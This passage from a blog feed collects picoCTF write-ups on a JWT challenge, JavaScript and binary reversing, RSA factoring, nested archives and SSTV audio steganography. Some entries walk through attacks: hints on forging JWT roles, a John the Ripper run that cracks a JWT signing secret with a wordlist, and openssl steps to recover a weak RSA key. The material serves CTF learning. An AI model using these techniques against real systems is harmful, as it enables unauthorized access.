&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>JWT&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>Too Much to list&lt;/p>
&lt;h2 id="hint">
 Hint
 &lt;a class="anchor" href="#hint">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Maybe try to find the JWT Signing Key (&amp;ldquo;secret key&amp;rdquo;) in the source code? Maybe it&amp;rsquo;s hardcoded somewhere? Or maybe try to crack it?&lt;/li>
&lt;li>The &amp;lsquo;role&amp;rsquo; and &amp;lsquo;userId&amp;rsquo; fields in the JWT can be of interest to you!&lt;/li>
&lt;li>The &amp;lsquo;controllers&amp;rsquo;, &amp;lsquo;services&amp;rsquo; and &amp;lsquo;security&amp;rsquo; java packages in the given source code might need your attention. We&amp;rsquo;ve provided a README.md file that contains some documentation.&lt;/li>
&lt;li>Upgrade your &amp;lsquo;role&amp;rsquo; with the new (cracked) JWT. And re-login for the new role to get reflected in browser&amp;rsquo;s localStorage.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題在AIS3 pre-exam的時候也有看到，但當時根本沒想法，只要題目看起來一複雜我就沒辦法分析了，所以還是看了Martin大的WP才知道解法，但有時候真的很考驗耐心，先看hint發現應該是考跟JWT有關&lt;/p></description></item><item><title>PicoCTF - Java Script Kiddie</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/</guid><description>&lt;h1 id="picoctf---java-script-kiddie">
 PicoCTF - Java Script Kiddie
 &lt;a class="anchor" href="#picoctf---java-script-kiddie">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/jsref/jsref_slice_array.asp">JavaScript Array slice()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fruits&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;Banana&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Orange&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Lemon&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Apple&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Mango&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">citrus&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fruits&lt;/span>.&lt;span style="color:#a6e22e">slice&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">Orange&lt;/span>,&lt;span style="color:#a6e22e">Lemon&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/javascript-uint8array-from-method/">JavaScript Uint8Array.from() Method&lt;/a>&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">array&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Uint8Array&lt;/span>.&lt;span style="color:#a6e22e">from&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;45465768654323456&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">array&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">Uint8Array&lt;/span>(&lt;span style="color:#ae81ff">17&lt;/span>) [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">7&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>&lt;a href="https://www.w3schools.com/jsref/jsref_fromcharcode.asp">JavaScript String.fromCharCode()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#ae81ff">65&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">text&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">A&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-htmlmixed=" data-lang="htmlmixed=">&amp;lt;html&amp;gt;
	&amp;lt;head&amp;gt; 
		&amp;lt;script src=&amp;#34;jquery-3.3.1.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
		&amp;lt;script&amp;gt;
			var bytes = [];
			$.get(&amp;#34;bytes&amp;#34;, function(resp) {
				bytes = Array.from(resp.split(&amp;#34; &amp;#34;), x =&amp;gt; Number(x));
			});

			function assemble_png(u_in){
				var LEN = 16;
				var key = &amp;#34;0000000000000000&amp;#34;;
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				}
				var result = [];
				for(var i = 0; i &amp;lt; LEN; i++){
					shifter = key.charCodeAt(i) - 48;
					for(var j = 0; j &amp;lt; (bytes.length / LEN); j ++){
						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
					}
				}
				while(result[result.length-1] == 0){
					result = result.slice(0,result.length-1);
				}
				document.getElementById(&amp;#34;Area&amp;#34;).src = &amp;#34;data:image/png;base64,&amp;#34; + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
				return false;
			}
		&amp;lt;/script&amp;gt;
	&amp;lt;/head&amp;gt;
	&amp;lt;body&amp;gt;

		&amp;lt;center&amp;gt;
			&amp;lt;form action=&amp;#34;#&amp;#34; onsubmit=&amp;#34;assemble_png(document.getElementById(&amp;#39;user_in&amp;#39;).value)&amp;#34;&amp;gt;
				&amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;user_in&amp;#34;&amp;gt;
				&amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34;&amp;gt;
			&amp;lt;/form&amp;gt;
			&amp;lt;img id=&amp;#34;Area&amp;#34; src=&amp;#34;&amp;#34;/&amp;gt;
		&amp;lt;/center&amp;gt;

	&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - JaWT Scratchpad</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/</guid><description>&lt;h1 id="picoctf---jawt-scratchpad">
 PicoCTF - JaWT Scratchpad
 &lt;a class="anchor" href="#picoctf---jawt-scratchpad">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/JO7xByQgQWK67eU0goHMeA?view#c">NTUCNS - HW3 - JWT Authentication&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題蠻有趣的，有結合其他東西當作解題的基礎，先看JWT的token，decode過後的結果表示：
&lt;img src="https://hackmd.io/_uploads/S1B-01POh.png" alt="" />&lt;/p>
&lt;p>也就是說，token只會隨著payload而變動，所以也沒有辦法用解public key的方式重新簽署文件，另外用alg=none也會出現Authentication failed，不過作者有在網頁中有給出提示，用&lt;a href="https://github.com/magnumripper/JohnTheRipper">John&lt;/a>，看起來就是用john-the-ripper解出token password&lt;/p>
&lt;h2 id="exploit---brute-force">
 Exploit - Brute Force
 &lt;a class="anchor" href="#exploit---brute-force">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Brute Force Password&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ cat jwt.txt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGhoIn0.j1yd-PJbjNraLhhBAxZBD2C1EVIyHqlnvKh_l-iVKG8%
$ ./john.exe ../jwt.txt --wordlist=../rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
ilovepico (?)
1g 0:00:00:02 DONE (2023-06-26 18:42) 0.3673g/s 2720Kp/s 2720Kc/s 2720KC/s ilovetitoelbambino..ilovejesus71
Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably
Session completed
&lt;/code>&lt;/pre>&lt;p>Token Password: &lt;code>ilovepico&lt;/code>&lt;/p></description></item><item><title>PicoCTF - john_pollard</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/</guid><description>&lt;h1 id="picoctf---john_pollard">
 PicoCTF - john_pollard
 &lt;a class="anchor" href="#picoctf---john_pollard">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.mkssoftware.com/docs/man1/openssl_rsa.1.asp">openssl - rsa&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>-----BEGIN CERTIFICATE-----
MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe
Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D
VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT
B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI
hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH
al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA
eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO
T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1
BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt
b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz
q16/S1WLvzg4PsElmv1f
-----END CERTIFICATE-----
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Hint 1: The flag is in the format picoCTF{p,q}&lt;/li>
&lt;li>Hint 2: Try swapping p and q if it does not work
這一題就只是把certificate解出來，發現n超小，所以就直接&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---openssl">
 Exploit - openssl
 &lt;a class="anchor" href="#exploit---openssl">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ openssl openssl x509 -in cert -pubkey -noout &amp;gt; public.pem
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----BEGIN PUBLIC KEY-----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----END PUBLIC KEY-----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ openssl rsa -pubin -in public.pem -text
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>RSA Public-Key: &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">53&lt;/span> bit&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Modulus: &lt;span style="color:#ae81ff">4966306421059967&lt;/span> &lt;span style="color:#f92672">(&lt;/span>0x11a4d45212b17f&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Exponent: &lt;span style="color:#ae81ff">65537&lt;/span> &lt;span style="color:#f92672">(&lt;/span>0x10001&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>writing RSA key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----BEGIN PUBLIC KEY-----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----END PUBLIC KEY-----
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use &lt;a href="https://www.alpertron.com/ECM.HTM">online tool&lt;/a> to factor
p = &lt;code>67867967&lt;/code>
q = &lt;code>73176001&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Kit Engine</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---kit-engine/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---kit-engine/</guid><description>&lt;h1 id="picoctf---kit-engine">
 PicoCTF - Kit Engine
 &lt;a class="anchor" href="#picoctf---kit-engine">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10216397">Google V8 Engine&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://v8.dev/docs/d8">Using d8&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>d8 is V8’s own developer shell.&lt;/p>
&lt;p>d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the &amp;ndash;help argument for more information about usage and flags.&lt;/p></description></item><item><title>PicoCTF - Let's get dynamic</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/</guid><description>&lt;h1 id="picoctf---lets-get-dynamic">
 PicoCTF - Let&amp;rsquo;s get dynamic
 &lt;a class="anchor" href="#picoctf---lets-get-dynamic">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
{
 int i; // [rsp+1Ch] [rbp-114h]
 char s2[64]; // [rsp+20h] [rbp-110h] BYREF
 char s[64]; // [rsp+60h] [rbp-D0h] BYREF
 char v7[8]; // [rsp+A0h] [rbp-90h] BYREF
 __int64 v8; // [rsp+A8h] [rbp-88h]
 __int64 v9; // [rsp+B0h] [rbp-80h]
 __int64 v10; // [rsp+B8h] [rbp-78h]
 __int64 v11; // [rsp+C0h] [rbp-70h]
 __int64 v12; // [rsp+C8h] [rbp-68h]
 __int16 v13; // [rsp+D0h] [rbp-60h]
 __int64 v14[6]; // [rsp+E0h] [rbp-50h]
 __int16 v15; // [rsp+110h] [rbp-20h]
 unsigned __int64 v16; // [rsp+118h] [rbp-18h]

 v16 = __readfsqword(0x28u);
 *v7 = 0xFD872AC7CA737102LL;
 v8 = 0x4915F12BF9F82DCBLL;
 v9 = 0xA7EF0D4C54003C10LL;
 v10 = 0x9399CCF74D02A843LL;
 v11 = 0x2AC6F818989688D7LL;
 v12 = 0x9F51EBCA33584C85LL;
 v13 = 231;
 v14[0] = 0x92D46893B5010A61LL;
 v14[1] = 0xA6BDE59D58F4EB4LL;
 v14[2] = 0xFC993A3238355027LL;
 v14[3] = 0xEDA7B28D7054D179LL;
 v14[4] = 0x419FBB499BD4CFBBLL;
 v14[5] = 0x935AE3903F554688LL;
 v15 = 185;
 fgets(s, 49, _bss_start);
 for ( i = 0; i &amp;lt; strlen(v7); ++i )
 s2[i] = *(v14 + i) ^ v7[i] ^ i ^ 0x13;
 if ( !memcmp(s, s2, 49uLL) )
 {
 puts(&amp;#34;No, that&amp;#39;s not right.&amp;#34;);
 return 1;
 }
 else
 {
 puts(&amp;#34;Correct! You entered the flag.&amp;#34;);
 return 0;
 }
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - like1000</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---like1000/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---like1000/</guid><description>&lt;h1 id="picoctf---like1000">
 PicoCTF - like1000
 &lt;a class="anchor" href="#picoctf---like1000">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="">like1000&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://stackoverflow.com/questions/2778153/how-to-extract-nested-tar-gz-files-easily">How to extract nested tar.gz files easily?&lt;/a>
&lt;a href="https://ithelp.ithome.com.tw/articles/10132603">Shell Script - While&lt;/a>&lt;/p>
&lt;h2 id="exploit---untar-1000-times">
 Exploit - Untar 1000 times
 &lt;a class="anchor" href="#exploit---untar-1000-times">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>For untar folders
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">#! /bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH
file_name=1000
for next in ${file_name}.tar
while [ $file_name &amp;gt; 1 ]
 do
 echo &amp;#34;Untaring - $file_name&amp;#34;
 tar -xvf ${file_name}.tar #-C ./
 file_name=$(($file_name-1))
 mkdir ./$file_name
 mv ${file_name}.tar ./$file_name
 cd ./${file_name}
 done
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>For getting flag
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">#! /bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH
file_name=999
while [ &amp;#34;$file_name&amp;#34; &amp;gt; &amp;#34;0&amp;#34; ]
 do
 cd ./${file_name}
 file_name=$(($file_name-1))
 if [ &amp;#34;$file_name&amp;#34; == &amp;#34;0&amp;#34; ]
 then ls -al
 cat filler.txt
 mv flag.png ~/CTF/PicoCTF/Misc/like1000
 fi
 done
exit 0
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://shengyu7697.github.io/shell-script-arithmetic/">Shell Script 變數相加&lt;/a>
&lt;a href="https://linuxhint.com/solve-gzip-stdin-not-gzip-format-error/">How to solve gzip: stdin: not in gzip format error&lt;/a>
&lt;a href="https://blog.csdn.net/cp_panda_5/article/details/79192688">解压缩报错tar: Error is not recoverable: exiting now&lt;/a>
&lt;a href="https://unix.stackexchange.com/questions/47584/in-a-bash-script-using-the-conditional-or-in-an-if-statement">In a bash script, using the conditional &amp;ldquo;or&amp;rdquo; in an &amp;ldquo;if&amp;rdquo; statement&lt;/a>&lt;/p></description></item><item><title>PicoCTF - m00nwalk</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/</guid><description>&lt;h1 id="picoctf---m00nwalk">
 PicoCTF - m00nwalk
 &lt;a class="anchor" href="#picoctf---m00nwalk">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/26?category=4&amp;amp;page=3">m00nwalk&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>Decode this &lt;a href="https://jupiter.challenges.picoctf.org/static/fc1edf07742e98a480c6aff7d2546107/message.wav">message&lt;/a> from the moon.
Hint:&lt;/p>
&lt;ul>
&lt;li>How did pictures from the moon landing get sent back to Earth?&lt;/li>
&lt;li>What is the CMU mascot?, that might help select a RX option&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://zh.wikipedia.org/wiki/%E6%85%A2%E6%89%AB%E6%8F%8F%E7%94%B5%E8%A7%86#%E5%9C%A8%E8%88%AA%E5%A4%A9%E9%A2%86%E5%9F%9F%E7%9A%84%E6%97%A9%E6%9C%9F%E5%BA%94%E7%94%A8">慢掃描電視 - slow-scan television(sstv)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h2 id="exploit---qsstv-">
 Exploit - qsstv +
 &lt;a class="anchor" href="#exploit---qsstv-">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>First, I thought it might be a &lt;code>mp3stego&lt;/code> problem but found nothing. So, I tried to find the write up about this question.&lt;/li>
&lt;li>Use QSSTV
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo apt-get install pavucontrol
$ sudo apt-get install qsstv
$ pactl load-module module-null-sink sink_name=virtual-cable
22
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>The Setting&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>&lt;code>pavucontrol&lt;/code>&lt;/p></description></item><item><title>PicoCTF - m00nwalk2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/</guid><description>&lt;h1 id="picoctf---m00nwalk2">
 PicoCTF - m00nwalk2
 &lt;a class="anchor" href="#picoctf---m00nwalk2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice?category=4&amp;amp;page=3">m00nwalk2&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>Revisit the last transmission. We think this &lt;a href="https://jupiter.challenges.picoctf.org/static/a33c9e5dae30c560704e6f2ffaba35c7/message.wav">transmission&lt;/a> contains a hidden message. There are also some clues &lt;a href="https://jupiter.challenges.picoctf.org/static/a33c9e5dae30c560704e6f2ffaba35c7/clue1.wav">clue 1&lt;/a>, &lt;a href="https://jupiter.challenges.picoctf.org/static/a33c9e5dae30c560704e6f2ffaba35c7/clue2.wav">clue 2&lt;/a>, &lt;a href="https://jupiter.challenges.picoctf.org/static/a33c9e5dae30c560704e6f2ffaba35c7/clue3.wav">clue 3&lt;/a>.&lt;/p>
&lt;p>Hint:&lt;/p>
&lt;ul>
&lt;li>Use the clues to extract the another flag from the .wav file&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/rrUS4fS8QxicWvvjqziIqg">m00nwalk&lt;/a>&lt;/p>
&lt;h2 id="exploit---qsstv">
 Exploit - QSSTV
 &lt;a class="anchor" href="#exploit---qsstv">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Follow the write up of m00nwalk then you&amp;rsquo;ll get 3 images from 3 clues respectively.
&lt;img src="https://i.imgur.com/Vq8ciM2.png" alt="" />
&lt;img src="https://i.imgur.com/Y5nS8wS.png" alt="" />
